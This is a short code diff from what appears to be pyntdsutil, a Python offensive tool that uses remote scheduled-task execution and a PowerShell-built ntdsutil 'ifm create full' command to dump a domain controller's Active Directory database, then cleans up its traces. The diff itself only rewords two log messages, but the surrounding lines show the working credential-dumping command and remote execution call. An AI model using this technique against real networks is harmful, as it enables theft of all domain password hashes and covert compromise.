@@ -441,7 +441,7 @@ class Ntdsutil:
         
         if self.is_admin:
             logging.info("Connected to %s as %s\\%s %s" % (self.target.address, self.target.domain.upper(), self.target.username, ( "(Admin!)" if self.is_admin  else "")))
-            logging.info("Artifacts must be cleaned up manually if pyntdsutil is abruptly terminated")
+            logging.info("Abrupt termination may impact artifact cleanup")
             command = ["powershell.exe -nop Set-Content -Encoding Default -Path '%s' -Value \"ac` i` ntds`r`nifm`r`ncreate` full` %s%s`r`nq`r`nq\"" % (self.command_file, self.tmp_dir, self.dump_location)]
             logging.debug('Writing command input file for ntdsutil.exe to %s' % (self.command_file))
             atsvc_exec = TSCH_EXEC(self.target.username, self.target.password, self.target.domain, self.target.ntlmhash, self.target.aesKey, self.target.do_kerberos, options.dc_ip,
@@ -498,7 +498,7 @@ class Ntdsutil:
                 atsvc_exec.play(self.target.address)
                 logging.debug('Deleted %s command input file for ntdsutil.exe' % (self.command_file))
                 logging.debug('Deleted %s%s dump directory on the %s share' % (self.tmp_dir, self.dump_location, self.share))
-                logging.info('Deleted artifacts on %s', self.target.address)
+                logging.info('Deleted artifacts on %s and closed connection', self.target.address)
             except Exception as e:
                 logging.error('Error deleting {} directory on share {}: {}'.format(self.dump_location, self.share, e))
         else:
